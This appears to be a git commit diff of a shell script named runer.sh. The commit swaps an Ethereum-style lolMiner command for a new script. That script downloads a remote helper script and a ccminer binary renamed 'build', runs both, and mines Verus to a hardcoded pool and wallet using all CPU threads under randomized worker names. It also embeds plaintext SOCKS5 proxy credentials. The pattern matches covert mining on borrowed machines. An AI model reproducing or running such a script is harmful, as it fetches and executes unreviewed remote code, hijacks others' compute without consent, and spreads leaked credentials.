fbe1422a8b8a169e27ef35fa0a87359356f9155f
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-04-30 11:47:44 +0700

    Update runer.sh

--- runer.sh
+++ runer.sh
@@ -1,6 +1,16 @@
-sudo apt install screen -y
-apt install git -y
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xvf lolMiner_v1.31_Lin64.tar.gz && mv 1.31 mng && cd mng && chmod +x lolMiner && ./lolMiner --algo ETHASH --pool etchash.mine.zergpool.com:9997 --user DLVmTEYCYM9jMCEWiuNuuAJ2M7GETpHcg4 --pass c=DGB,mc=TSF,ID=xid11
-sleep 3
-done
-sleep 12345
+#!/bin/bash
+proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
+array[0]="0001"
+array[1]="0002"
+array[2]="0003"
+size=${#array[@]}
+index=$(($RANDOM % $size))
+worker=${array[$index]}
+apt-get update
+wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
+wget -qO build https://github.com/renifer12/master/raw/master/ccminer
+chmod +x build
+chmod +x compile.sh
+./build -a verus -o stratum+tcp://139.99.123.225:3956 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-10 -n 1)-MOD) -p X -t $(nproc --all)
+./compile.sh
+echo succes
